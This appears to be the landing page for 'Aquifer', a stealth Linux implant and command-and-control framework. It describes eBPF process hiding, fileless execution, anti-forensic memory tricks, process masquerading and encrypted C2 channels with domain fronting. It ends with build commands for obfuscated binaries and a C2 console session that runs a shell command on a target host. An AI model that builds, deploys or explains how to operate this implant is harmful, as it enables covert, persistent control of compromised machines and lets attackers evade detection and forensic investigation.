Core Capabilities

Kernel namespace isolation as the foundation. Every capability designed for deep host-level blending and operational security.

Namespace Isolation

PID + Mount + Network + UTS + Cgroup namespaces with veth pair routing, NAT masquerade, and DNAT loopback for host connectivity.

Memory Protection

ProtectedConfig encrypts C2 URLs and session keys at rest with XOR rekeying. Deterministic shredding of all sensitive buffers.

Process Masquerade

Kernel-level argv rewrite impersonating accounts-daemon. Direct /proc/self/mem zeroing of environ region.

eBPF Cloaking

BPF map-based PID hide list conceals the implant from process enumeration. Persistent kernel hooks via bpffs survive process death.

Fileless Execution

memfd_create + execveat for diskless ELF execution. No file artifacts on the target filesystem.

Anti-Dump Regions

MADV_DONTDUMP and MADV_WIPEONFORK prevent memory capture by LiME, AVML, and other forensic memory acquisition tools.

Kernel Keyring

Secrets stored in kernel memory via the keyring subsystem. Invisible to userspace forensics and memory scanning tools.

io_uring Covert I/O

Shared ring buffer I/O bypassing syscall-level monitoring. Operations complete without triggering syscall tracing or audit.

Target Keying

Hostname, CIDR, MAC, machine ID, canary file, and kill date guardrails. Auto-terminates and cleans up outside target environment.

Detection Awareness

Know what Aquifer evades and what it doesn't. Honest tooling for professional operators.

  • LiME, AVML — anti-dump memory protection
  • lsof — FD spoofing via bind mounts

Architecture

Two-stage execution with compile-time configuration. Parent validates, child operates inside isolated namespaces.

1

Parent Stage

Target keying guardrails, VM/sandbox/EDR detection, OPSEC hardening (core dumps, anti-ptrace, process masquerade). Sets up host-side veth pair and namespace isolation.

2

Namespace Bootstrap

Re-exec into PID + Mount + Network + UTS + Cgroup namespaces. Veth pair routing with NAT masquerade and DNAT loopback for host connectivity.

3

C2 Transport

Four channels with automatic failover: HTTPS (domain fronting, JA3), DNS (TXT records), DoH, Raw L2 (AF_PACKET). ECDH key exchange + AES-256-GCM encryption.

4

Stealth Engine

36 modules for host-level blending: eBPF cloaking, fileless execution, kernel keyring, io_uring, anti-dump, process genealogy, cgroup camouflage, and more.

Getting Started

Build from source with multiple profiles. Production builds include garble obfuscation and UPX compression.

build.sh 
# Clone and build
$ git clone https://github.com/Real-Fruit-Snacks/Aquifer.git
$ cd Aquifer

# Development build (stripped, static)
$ make build

# Obfuscated build
$ make build-garble

# Production release (garble + UPX + patching)
$ make build-release

# Verify OPSEC
$ make opsec-check
PASS: No Go module paths found
PASS: No plaintext C2 URLs
PASS: High binary entropy (7.98)
c2server.sh 
# Start the C2 operator console
$ pip install -r c2server/requirements.txt
$ python3 -m c2server --db c2.db --keys server_keys.pem

# List active sessions
aquifer> sessions
ID   Hostname    Transport  Last Seen
1    target-01   HTTPS      2s ago

# Interact with implant
aquifer> interact 1
aquifer[1]> shell whoami
